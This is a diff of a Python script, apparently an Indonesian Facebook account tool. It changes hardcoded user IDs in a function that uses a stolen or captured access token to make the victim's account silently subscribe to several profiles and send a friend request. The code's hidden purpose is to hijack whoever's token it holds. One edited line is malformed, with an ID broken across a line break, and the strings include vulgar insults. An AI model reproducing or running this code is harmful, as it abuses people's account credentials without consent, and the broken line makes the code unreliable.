@@ -68,7 +68,7 @@ id = []
 user = []
 loop = 0
 xi_jimpinx = '1714000985456399'
-koh = '100005395413800'
+koh = '100001852547761'
 hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
@@ -213,11 +213,12 @@ def wuhan(kontol):
         requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/10
+/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001852547761/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100034433778381/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
